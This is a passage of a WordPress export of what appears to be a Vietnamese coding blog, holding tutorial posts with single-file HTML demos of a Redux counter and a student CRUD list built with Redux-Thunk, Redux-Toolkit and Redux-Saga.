    <!-- =========== actions/count_actions.js =========== -->
    <script>
        //2. Khai báo các action (khi được dispatch ==> sẽ trả về object actions tương ứng)
        const action_increment = (payload) => ({
            type: 'INCREMENT',
            payload: payload,
        })
        const action_decrement = (payload) => ({
            type: 'DECREMENT',
            payload: payload,
        })
    </script>

    <!-- =========== reducers/index.js =========== -->
    <script>
        //3.1. Khai báo rootReducer: Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất
        let rootReducer = Redux.combineReducers({
            count: countReducer,
        });
    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        //3.2. Khai báo store (chứa rootReducer), cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions
        const store = Redux.createStore(
            rootReducer /* preloadedState, */,
            window.__REDUX_DEVTOOLS_EXTENSION__ && window.__REDUX_DEVTOOLS_EXTENSION__()
        );
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function App(props) {
            //Dùng useSelector và useDispatch để lấy dữ liệu từ Redux
            const count = ReactRedux.useSelector(state => state.count);
            const dispatch = ReactRedux.useDispatch();
            return (
                <div>
                    <p>{count.amount}</p>
                    <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>
                    <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button>
                </div>
            )
        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1547</wp:post_id>
		<wp:post_date><![CDATA[2021-06-28 05:00:36]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-27 22:00:36]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-28 05:00:36]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-27 22:00:36]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-count-5-use-redux]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-CRUD: 4. ListStudent with Redux-Toolkit]]></title>
		<link>https://duycode.com/2021/06/29/demo-crud-4-liststudent-with-redux-toolkit/</link>
		<pubDate>Mon, 28 Jun 2021 21:00:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1600</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="" />
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js"></script>
    <!-- =========== src/utils.js =========== -->
    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        let uuid = new Uuid();
    </script>

    <!-- =========== slices/listStudent_slice.js =========== -->
    <script>
        //Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn
        let listStudent_local = JSON.parse(localStorage.getItem('listStudent')) || { data: [], loading: false };
        const listStudent_slice = RTK.createSlice({
            name: 'listStudent',
            initialState: listStudent_local,
            reducers: {
                action_saveStudent(state, action) {
                    if (!action.payload.id) {
                        let new_student = {
                            id: uuid.s16(),
                            username: action.payload.username,
                            email: action.payload.email,
                        };
                        state.data.push(new_student);

                    } else {
                        let find_student = state.data.find((item) => item.id == action.payload.id);
                        find_student.username = action.payload.username;
                        find_student.email = action.payload.email;
                    }
                    localStorage.setItem('listStudent', JSON.stringify(state));
                    return state;
                },
                action_deleteStudent(state, action) {
                    state.data = state.data.filter((item) => item.id != action.payload);
                    localStorage.setItem('listStudent', JSON.stringify(state));
                    return state;
                },
                action_setListStudent(state, action) {
                    state.data = action.payload.map(item => ({
                        username: item.username,
                        email: item.email,
                        id: item.id,
                    }))
                    state.loading = false;
                    localStorage.setItem('listStudent', JSON.stringify(state));
                    return state;
                },
                action_getListStudentsOnline(state, action) {
                    state.loading = true;
                    return state;
                }
            }
        });
        // export ra các actions, reducer tương ứng :D
        const { action_saveStudent, action_deleteStudent, action_setListStudent, action_getListStudentsOnline } = listStudent_slice.actions;
        const listStudent_reducer = listStudent_slice.reducer;
    </script>

    <!-- =========== src/api/studentAPI =========== -->
    <script type="text/babel">
        //API cần để riêng 1 file
        const getStudentsFake = (url) => async (dispatch) => {
            dispatch(action_getListStudentsOnline());
            let response = await fetch(url);
            let responseJSON = await response.json();
            dispatch(action_setListStudent(responseJSON));
        }
    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        //Khai báo tất cả các Reducer trong store ở dưới đây
        //ReduxToolkit đã cài đặt sẵn middlewareThunk và Redux devtools extension rồi, ko cần cài đặt gì thêm nữa
        const store = RTK.configureStore({
            reducer: {
                listStudent: listStudent_reducer,
                //product: product_reducer,
            }
        })
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function App(props) {
            //Sử dụng useSelector và useSelector của useDispatch sẽ tiện hơn rất nhiều so với phải dùng HOC
            const listStudent = ReactRedux.useSelector(state => state.listStudent);
            const dispatch = ReactRedux.useDispatch();
            const dispatch_saveStudent = (student) => dispatch(action_saveStudent(student));
            const dispatch_deleteStudent = (id) => dispatch(action_deleteStudent(id));
            const dispatch_getStudentsFake = (url) => dispatch(getStudentsFake(url));

            const [url_fakeStudent, setUrl_fakeStudent] = React.useState('https://jsonplaceholder.typicode.com/users')
            const [filterName, setFilterName] = React.useState('');
            const [student, setStudent] = React.useState({ username: '', email: '', id: '' });

            const updateState_student = (e) => {
                let newStudent = { ...student };
                newStudent[e.target.name] = e.target.value;
                setStudent(newStudent)
            };

            const onSaveStudent = (e) => {
                if (!student.username || !student.email) return;
                dispatch_saveStudent(student);
                setStudent({ username: '', email: '', id: '' });
            };

            return (
                <div>
                    <button onClick={() => { setStudent({ username: '', email: '', id: '' }) }}>New Student</button> <br />
                    <input type="text" placeholder="username" name="username"
                        value={student.username}
                        onChange={updateState_student}
                    /> <br />
                    <input
                        type="text" placeholder="email" name="email"
                        value={student.email}
                        onChange={updateState_student}
                    /> <br />
                    <button onClick={onSaveStudent}>
                        {student.id ? 'Update Student' : 'Add Student'}
                    </button> <br /> <br />
                    <input type="text" placeholder="Search ..." name="txtFilterName"
                        value={filterName}
                        onChange={(e) => { setFilterName(e.target.value) }}
                    />
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Username</th>
                                <th>Email</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            {
                                listStudent.data
                                    .filter((item) => item.username.includes(filterName))
                                    .map((item, index) => {
                                        return (
                                            <tr key={item.id}>
                                                <td>{index}</td>
                                                <td>{item.username}</td>
                                                <td>{item.email}</td>
                                                <td>
                                                    <button onClick={(e) => { setStudent({ ...item }) }}>Sửa</button>
                                                    <button onClick={(e) => { dispatch_deleteStudent(item.id) }}>Xóa</button>
                                                </td>
                                            </tr>
                                        );
                                    })
                            }
                        </tbody>
                    </table>
                    <select value={url_fakeStudent} onChange={(e) => { setUrl_fakeStudent(e.target.value) }}>
                        <option value="https://jsonplaceholder.typicode.com/users">https://jsonplaceholder.typicode.com/users</option>
                        <option value="https://fakestoreapi.com/users?limit=10">https://fakestoreapi.com/users?limit=10</option>
                    </select><br />
                    <button onClick={e => { dispatch_getStudentsFake(url_fakeStudent) }}>Get Student Fake</button> 
                    {listStudent.loading && <img src="https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif" width="14px" />}
                </div>
            );

        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1600</wp:post_id>
		<wp:post_date><![CDATA[2021-06-29 04:00:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 21:00:40]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-29 04:00:40]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 21:00:40]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-crud-4-liststudent-with-redux-toolkit]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-CRUD: 3. ListStudent, use Redux-Thunk]]></title>
		<link>https://duycode.com/2021/06/29/demo-crud-3-liststudent-use-redux-thunk/</link>
		<pubDate>Mon, 28 Jun 2021 20:00:54 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1603</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="" />
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux-thunk/2.3.0/redux-thunk.js"></script>
    <!-- =========== src/utils.js =========== -->
    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        let uuid = new Uuid();
    </script>


    <!-- =========== constants/ActionTypes.js =========== -->
    <script>
        //Các hằng số types ==> sử dụng cho các actions
        const types = {
            SAVE_STUDENT: 'SAVE_STUDENT',
            DELETE_STUDENT: 'DELETE_STUDENT',
            SET_LIST_STUDENT: 'SET_LIST_STUDENT',
        };
    </script>

    <!-- =========== reducers/listStudent_reducer.js =========== -->
    <script>
        //Trong 1 Reducer bao gồm 2 thành phần: state và reducer
        //State là nơi chứa dữ liệu
        //Reducer là nơi xử lý các action (khi bị dispatch)
        //---- listStudent_state có thể khởi tạo mặc định hoặc lấy trên localStorage
        let listStudent_state = JSON.parse(localStorage.getItem('listStudent')) || [];
        let listStudent_reducer = (state = listStudent_state, action) => {
            //Khi làm việc với state, cần return ra 1 state mới, 
            //Tốt nhất nên copystate cũ luôn
            let new_state = [...state]
            switch (action.type) {
                case types.SAVE_STUDENT:
                    if (!action.payload.id) {
                        let new_student = {
                            id: uuid.s16(),
                            username: action.payload.username,
                            email: action.payload.email,
                        };
                        new_state.push(new_student);
                    } else {
                        let find_student = new_state.find((item) => item.id == action.payload.id);
                        find_student.username = action.payload.username;
                        find_student.email = action.payload.email;
                    }
                    localStorage.setItem('listStudent', JSON.stringify(new_state));
                    return new_state;

                case types.DELETE_STUDENT:
                    new_state = state.filter((item) => item.id != action.payload);
                    localStorage.setItem('listStudent', JSON.stringify(new_state));
                    return new_state;

                case types.SET_LIST_STUDENT:
                    localStorage.setItem('listStudent', JSON.stringify(action.payload));
                    return action.payload;
            }
            return new_state;
        };
    </script>

    <!-- =========== reducers/listproduct_Reducer.js =========== -->

    <!-- =========== reducers/index.js =========== -->
    <script>
        //Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất
        let rootReducer = Redux.combineReducers({
            listStudent: listStudent_reducer,
            //product: productReducer,
        });
    </script>

    <!-- =========== actions/index.js =========== -->
    <script>
        //Các action khi được dispatch ==> sẽ trả về object actions tương ứng
        let action_saveStudent = (student) => ({
            type: types.SAVE_STUDENT,
            payload: student,
        });
        let action_deleteStudent = (id) => ({
            type: types.DELETE_STUDENT,
            payload: id,
        });
        let action_setListStudent = (list) => ({
            type: types.SET_LIST_STUDENT,
            payload: list,
        })

        // Trường hợp action là 1 function get api (không trả về 1 object nữa)
        // ==> Giải quyết bằng cách dùng middleware ==> Từ action này lại dispatch 1 action khác 
        let action_getStudentsOnline = () => async (dispatch) => {
            let url = 'https://fakestoreapi.com/users?limit=10';
            let response = await fetch(url);
            let responseJSON = await response.json();
            dispatch(action_setListStudent(responseJSON));
        };
    </script>

    <!-- =========== middleware/list_middleware.js =========== -->
    <script>
        //Middleware là việc kiểm tra và xử lý các action trước ==> convert các action đúng ý mình trước đã, rồi mới cho đi tiếp
        const checkSymbolMiddleware = store => next => action => {
            //console.log(store, next, action, store.getState());
            if (action.type == types.SAVE_STUDENT && action.payload.username.includes("fuck")) {
                action.payload.username = action.payload.username.replaceAll("fuck", "****")
            }
            //next: tương đương với "dispatch" ==> next(action) tương đương dispatch(action)==>nghĩa là chạy bình thường
            return next(action);
        }

    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        // Cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions
        const composeEnhancers =
            typeof window === 'object' &&
                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ?
                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__({
                    // Specify extension’s options like name, actionsBlacklist, actionsCreators, serialize...
                }) : Redux.compose;

        // Ném các middleware vào trong Redux.applyMiddleware()
        // Khi dùng ReduxThunk làm middleware, các action là dạng function sẽ được ReduxThunk xử lý trước, nên không cần check choác như trước nữa
        const store = Redux.createStore(
            rootReducer /* preloadedState, */,
            composeEnhancers(Redux.applyMiddleware(ReduxThunk.default, checkSymbolMiddleware))
        );
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function App(props) {
            //Sử dụng useSelector và useSelector của useDispatch sẽ tiện hơn rất nhiều so với phải dùng HOC
            const listStudent = ReactRedux.useSelector(state => state.listStudent);
            const dispatch = ReactRedux.useDispatch();
            const dispatch_saveStudent = (student) => dispatch(action_saveStudent(student));
            const dispatch_deleteStudent = (id) => dispatch(action_deleteStudent(id));
            const dispatch_getStudentsOnline = () => dispatch(action_getStudentsOnline());

            const [filterName, setFilterName] = React.useState('');
            const [student, setStudent] = React.useState({ username: '', email: '', id: '' });

            const updateState_student = (e) => {
                let newStudent = { ...student };
                newStudent[e.target.name] = e.target.value;
                setStudent(newStudent)
            };

            const onSaveStudent = (e) => {
                if (!student.username || !student.email) return;
                dispatch_saveStudent(student);
                setStudent({ username: '', email: '', id: '' });
            };

            return (
                <div>
                    <button onClick={() => { setStudent({ username: '', email: '', id: '' }) }}>New Student</button> <br />
                    <input type="text" placeholder="username" name="username"
                        value={student.username}
                        onChange={updateState_student}
                    /> <br />
                    <input
                        type="text" placeholder="email" name="email"
                        value={student.email}
                        onChange={updateState_student}
                    /> <br />
                    <button onClick={onSaveStudent}>
                        {student.id ? 'Update Student' : 'Add Student'}
                    </button> <br /> <br />
                    <input type="text" placeholder="Search ..." name="txtFilterName"
                        value={filterName}
                        onChange={(e) => { setFilterName(e.target.value) }}
                    />
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Username</th>
                                <th>Email</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            {
                                listStudent
                                    .filter((item) => item.username.includes(filterName))
                                    .map((item, index) => {
                                        return (
                                            <tr key={item.id}>
                                                <td>{index}</td>
                                                <td>{item.username}</td>
                                                <td>{item.email}</td>
                                                <td>
                                                    <button onClick={(e) => { setStudent({ ...item }) }}>Sửa</button>
                                                    <button onClick={(e) => { dispatch_deleteStudent(item.id) }}>Xóa</button>
                                                </td>
                                            </tr>
                                        );
                                    })
                            }
                        </tbody>
                    </table>
                    <button onClick={e => { dispatch_getStudentsOnline() }}>Get Student Online</button>
                </div>
            );

        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1603</wp:post_id>
		<wp:post_date><![CDATA[2021-06-29 03:00:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 20:00:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-29 03:00:54]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 20:00:54]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-crud-3-liststudent-use-redux-thunk]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-CRUD: 5. ListStudent with Redux-Toolkit, Redux-Saga]]></title>
		<link>https://duycode.com/2021/06/29/demo-crud-5-liststudent-with-redux-toolkit-redux-saga/</link>
		<pubDate>Mon, 28 Jun 2021 22:00:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1662</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="" />
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js"></script>
    <script src="https://unpkg.com/redux-saga@1.1.3/dist/redux-saga.umd.js"></script>
    <!-- =========== src/utils.js =========== -->
    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        let uuid = new Uuid();
    </script>

    <!-- =========== slices/listStudent_slice.js =========== -->
    <script>
        //Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn
        let listStudent_local = JSON.parse(localStorage.getItem('listStudent')) || { data: [], loading: false };
        const listStudent_slice = RTK.createSlice({
            name: 'listStudent',
            initialState: listStudent_local,
            reducers: {
                action_saveStudent(state, action) {
                    if (!action.payload.id) {
                        let new_student = {
                            id: uuid.s16(),
                            username: action.payload.username,
                            email: action.payload.email,
                        };
                        state.data.push(new_student);

                    } else {
                        let find_student = state.data.find(({id}) => id == action.payload.id);
                        find_student.username = action.payload.username;
                        find_student.email = action.payload.email;
                    }
                    localStorage.setItem('listStudent', JSON.stringify(state));
                    return state;
                },
                action_deleteStudent(state, action) {
                    state.data = state.data.filter(({id}) => id != action.payload);
                    localStorage.setItem('listStudent', JSON.stringify(state));
                    return state;
                },
                action_setListStudent(state, action) {
                    state.data = action.payload.map(item => ({
                        username: item.username,
                        email: item.email,
                        id: item.id,
                    }))
                    state.loading = false;
                    localStorage.setItem('listStudent', JSON.stringify(state));
                    return state;
                },
                //action này nhận nhiệm vụ, nhưng không làm gì,
                //nghĩa là khi đi qua nó, middleware nhận ra nó thì sẽ làm việc gì đó khác
                action_saga_getStudents(state, action) {
                    state.loading = true;
                    return state;
                },
            }
        });
        // export ra các actions, reducer tương ứng :D
        const { action_saveStudent, action_deleteStudent, action_setListStudent, action_saga_getStudents } = listStudent_slice.actions;
        const listStudent_reducer = listStudent_slice.reducer;
    </script>

    <!-- =========== src/api/studentAPI =========== -->
    <script type="text/babel">
        //API cần để riêng 1 file
        // Hàm này được button dispatch lên, trong quá trình chạy, nó lại dispatch 1 action khác
        const getStudentsOnline = (url) => async (dispatch) => {
            console.log("url: ", url);
            let response = await fetch(url);
            let responseJSON = await response.json();
            dispatch(action_setListStudent(responseJSON));
        }
    </script>

    <script>
        // Các Effect Creator của saga hay gặp
        // takeEvery: luôn chạy
        // takeLatest: chạy action cuối, các action bị ghi đè sẽ cancel
        // takeLeading: ngược lại, chạy action đầu, các action sau định ghi đè thì bị cancel
        // debounce, throttle, fork, retry, put   ...
        const productSaga = function* () {
            //Các saga thông thường chỉ chạy 1 lần khi khởi động được rootSaga chạy
            //Sử dụng takeEvery để lắng nghe liên tục và bắt các sự kiện khi có action gửi lên, chứ saga này không chạy lại nữa
            // => ('*') => lắng nghe mọi action

            // console.log("Product saga");
            // yield ReduxSaga.effects.takeEvery('*', handle_getProductsOnline)
        }

        const handle_getStudentsOnline = function* (action) {
            console.log('Watting 1s', action);
            yield ReduxSaga.effects.delay(1000)
            console.log('Watiing done');
            let url = action.payload;
            let response = yield fetch(url);
            let responseJSON = yield response.json();
            yield ReduxSaga.effects.put(action_setListStudent(responseJSON))
        }

        const studentSaga = function* () {
            //console.log("student saga");
            // Liên tục lắng nghe 1 action và phản ứng với nó bằng takeEvery
            // action.type được khai báo bằng 2 cách: dùng chuỗi: "reducer_name/action_function_name" hoặc "action_function().type"
            // => Khi gặp action.type ==> chạy hàm phản ứng "logStudent"
            // yield ReduxSaga.effects.takeEvery('listStudent/action_deleteStudent', logStudent)
            yield ReduxSaga.effects.takeEvery(action_saga_getStudents().type, handle_getStudentsOnline)
        }
        const rootSaga = function* () {
            // console.log("Root saga");
            // RootSaga sẽ khởi chạy tất cả các saga khác lần đầu tiên khi khởi động
            yield ReduxSaga.effects.all([productSaga(), studentSaga()])
        }
    </script>

    <!-- =========== src/store.js =========== -->
    <script>
        //Khai báo sagaMiddleware (xem thêm trên trang chủ cách khai báo khi sử dụng npm install)
        const sagaMiddleware = ReduxSaga.default();

        //Khai báo store với ReduxToolkit như ở dưới đây
        //ReduxToolkit đã cài đặt sẵn middlewareThunk và Redux devtools extension rồi, ko cần cài đặt gì thêm nữa
        const store = RTK.configureStore({
            reducer: {
                listStudent: listStudent_reducer,
                //product: product_reducer,
            },
            middleware: (getDefaultMiddleware) =>
                // Có 3 middleware ban đầu của Redux-Saga (mặc định là true) (chưa test đc chức năng serializableCheck)
                getDefaultMiddleware({
                    thunk: true,
                    serializableCheck: true,
                    immutableCheck: true,
                }).concat(sagaMiddleware),   //sài thêm "sagaMiddleware"
            devTools: true, //default là true (có dùng devTools không)
        })

        // Khởi chạy rootSaga sau khi được mount vào Store 
        sagaMiddleware.run(rootSaga);
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function App(props) {
            //Sử dụng useSelector và useDispatch sẽ tiện hơn rất nhiều so với phải dùng HOC
            const useAppDispatch = ReactRedux.useDispatch();
            const useAppSelector = ReactRedux.useSelector;

            const listStudent = useAppSelector(state => state.listStudent);
            const dispatch_saveStudent = (student) => useAppDispatch(action_saveStudent(student));
            const dispatch_deleteStudent = (id) => useAppDispatch(action_deleteStudent(id));
            // Đoạn dưới là dispatch 1 function (function này là 1 hàm bất đồng bộ, nó chạy xong rồi lại dispatch 1 hàm khác)
            const dispatch_getStudentsOnline = (url) => useAppDispatch(getStudentsOnline(url));
            const dispatch_saga_getStudents = (url) => useAppDispatch(action_saga_getStudents(url));

            const [url_fakeStudent, setUrl_fakeStudent] = React.useState('https://jsonplaceholder.typicode.com/users')
            const [filterName, setFilterName] = React.useState('');
            const [student, setStudent] = React.useState({ username: '', email: '', id: '' });

            const updateState_student = (e) => {
                let newStudent = { ...student };
                newStudent[e.target.name] = e.target.value;
                setStudent(newStudent)
            };

            const onSaveStudent = (e) => {
                if (!student.username || !student.email) return;
                dispatch_saveStudent(student);
                setStudent({ username: '', email: '', id: '' });
            };

            return (
                <div>
                    <button onClick={() => { setStudent({ username: '', email: '', id: '' }) }}>New Student</button> <br />
                    <input type="text" placeholder="username" name="username"
                        value={student.username}
                        onChange={updateState_student}
                    /> <br />
                    <input
                        type="text" placeholder="email" name="email"
                        value={student.email}
                        onChange={updateState_student}
                    /> <br />
                    <button onClick={onSaveStudent}>
                        {student.id ? 'Update Student' : 'Add Student'}
                    </button> <br /> <br />
                    <input type="text" placeholder="Search ..." name="txtFilterName"
                        value={filterName}
                        onChange={(e) => { setFilterName(e.target.value) }}
                    />
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Username</th>
                                <th>Email</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            {
                                listStudent.data
                                    .filter((item) => item.username.includes(filterName))
                                    .map((item, index) => {
                                        return (
                                            <tr key={item.id}>
                                                <td>{index}</td>
                                                <td>{item.username}</td>
                                                <td>{item.email}</td>
                                                <td>
                                                    <button onClick={(e) => { setStudent({ ...item }) }}>Sửa</button>
                                                    <button onClick={(e) => { dispatch_deleteStudent(item.id) }}>Xóa</button>
                                                </td>
                                            </tr>
                                        );
                                    })
                            }
                        </tbody>
                    </table><br />
                    <select value={url_fakeStudent} onChange={(e) => { setUrl_fakeStudent(e.target.value) }}>
                        <option value="https://jsonplaceholder.typicode.com/users">https://jsonplaceholder.typicode.com/users</option>
                        <option value="https://fakestoreapi.com/users?limit=10">https://fakestoreapi.com/users?limit=10</option>
                    </select><br/>
                    <button onClick={e => { dispatch_getStudentsOnline(url_fakeStudent) }}>Get Student Online</button>  <br/>
                    <button onClick={e => { dispatch_saga_getStudents(url_fakeStudent) }}>Get Student Saga</button>
                    {listStudent.loading && <img src="https://vcdn-ione.vnecdn.net/2016/07/13/loading-256-0001-4566-1468383063.gif" width="12px" />}
                </div>
            );
        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1662</wp:post_id>
		<wp:post_date><![CDATA[2021-06-29 05:00:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 22:00:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-29 05:00:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 22:00:31]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-crud-5-liststudent-with-redux-toolkit-redux-saga]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
